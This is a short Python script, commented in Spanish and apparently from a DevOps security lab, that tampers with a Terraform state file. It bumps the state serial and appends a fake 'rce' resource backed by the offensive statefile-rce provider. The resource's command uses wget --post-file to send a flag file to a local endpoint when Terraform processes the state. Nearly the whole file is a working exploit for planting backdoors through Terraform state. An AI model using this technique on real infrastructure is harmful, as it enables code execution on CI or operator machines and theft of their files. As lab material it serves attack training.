#!/usr/bin/env python3
"""Inyecta un recurso rce en el state de Terraform.

Uso: python3 inject.py tfstate.json > tfstate-tampered.json
"""
import json
import sys

CMD = (
    "wget -qO- --post-file=/hosthome/.devops-lab-tf-flag "
    "http://localhost:8888/tf/state-backdoor >/dev/null"
)

state = json.load(open(sys.argv[1]))
state["serial"] = int(state.get("serial", 1)) + 1
# Idempotente: si ya hay un rce.testing de una pasada anterior, lo reemplaza.
state["resources"] = [
    r for r in state.get("resources", []) if (r.get("type"), r.get("name")) != ("rce", "testing")
]
state["resources"].append(
    {
        "mode": "managed",
        "type": "rce",
        "name": "testing",
        "provider": 'provider["registry.terraform.io/offensive-actions/statefile-rce"]',
        "instances": [
            {
                "schema_version": 0,
                "attributes": {"command": CMD, "id": "rce"},
                "sensitive_attributes": [],
                "private": "bnVsbA==",
            }
        ],
    }
)
json.dump(state, sys.stdout, indent=2)
